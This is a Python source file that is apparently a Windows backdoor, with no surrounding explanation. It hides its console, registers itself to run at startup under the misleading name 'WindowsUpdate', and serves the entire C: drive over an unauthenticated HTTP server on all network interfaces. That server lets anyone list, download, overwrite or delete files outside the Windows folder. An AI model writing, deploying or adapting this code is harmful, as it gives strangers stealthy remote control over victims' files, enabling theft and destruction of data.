import os
import sys
import ctypes
import winreg
import shutil
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import unquote

PORT = 6767

def enable_persistence():
    try:
        script = os.path.abspath(sys.argv[0])
        key = winreg.HKEY_CURRENT_USER
        sub = r"Software\Microsoft\Windows\CurrentVersion\Run"
        h = winreg.OpenKey(key, sub, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(h, "WindowsUpdate", 0, winreg.REG_SZ, f'"{script}"')
        winreg.CloseKey(h)
    except:
        pass

def hide_console():
    try:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        ctypes.windll.kernel32.FreeConsole()
    except:
        pass

class FullHandler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        pass
    
    def do_GET(self):
        path = unquote(self.path)
        if path == '/':
            path = 'C:\\'
        else:
            path = 'C:\\' + path.lstrip('/')
        path = os.path.normpath(path)
        
        if not os.path.exists(path):
            self.send_response(404)
            self.end_headers()
            return
        
        if os.path.isdir(path):
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            try:
                items = os.listdir(path)
            except:
                items = []
            html = '<html><body><h1>' + path + '</h1><ul>'
            for item in sorted(items):
                full = os.path.join(path, item)
                url = '/' + full.replace('\\', '/')[3:]
                if os.path.isdir(full):
                    html += f'<li><a href="{url}/">{item}/</a></li>'
                else:
                    try:
                        size = os.path.getsize(full)
                        html += f'<li><a href="{url}">{item}</a> ({size} bytes)</li>'
                    except:
                        html += f'<li>{item}</li>'
            html += '</ul></body></html>'
            self.wfile.write(html.encode())
        else:
            try:
                with open(path, 'rb') as f:
                    self.send_response(200)
                    self.send_header('Content-type', 'application/octet-stream')
                    self.end_headers()
                    self.wfile.write(f.read())
            except:
                self.send_response(403)
                self.end_headers()
    
    def do_PUT(self):
        try:
            length = int(self.headers.get('Content-Length', 0))
            data = self.rfile.read(length)
            path = unquote(self.path)
            path = 'C:\\' + path.lstrip('/')
            path = os.path.normpath(path)
            
            if path.lower().startswith('c:\\windows'):
                self.send_response(403)
                self.end_headers()
                self.wfile.write(b'{"error": "forbidden"}')
                return
            
            os.makedirs(os.path.dirname(path), exist_ok=True)
            with open(path, 'wb') as f:
                f.write(data)
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b'{"ok": true}')
        except:
            self.send_response(500)
            self.end_headers()
    
    def do_DELETE(self):
        try:
            path = unquote(self.path)
            path = 'C:\\' + path.lstrip('/')
            path = os.path.normpath(path)
            
            if path.lower() == 'c:\\' or path.lower().startswith('c:\\windows'):
                self.send_response(403)
                self.end_headers()
                self.wfile.write(b'{"error": "forbidden"}')
                return
            
            if os.path.isfile(path):
                os.remove(path)
            elif os.path.isdir(path):
                shutil.rmtree(path)
            else:
                self.send_response(404)
                self.end_headers()
                return
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b'{"ok": true}')
        except:
            self.send_response(500)
            self.end_headers()

def start():
    hide_console()
    enable_persistence()
    os.chdir('C:\\')
    httpd = HTTPServer(('0.0.0.0', PORT), FullHandler)
    httpd.serve_forever()

if __name__ == '__main__':
    start()
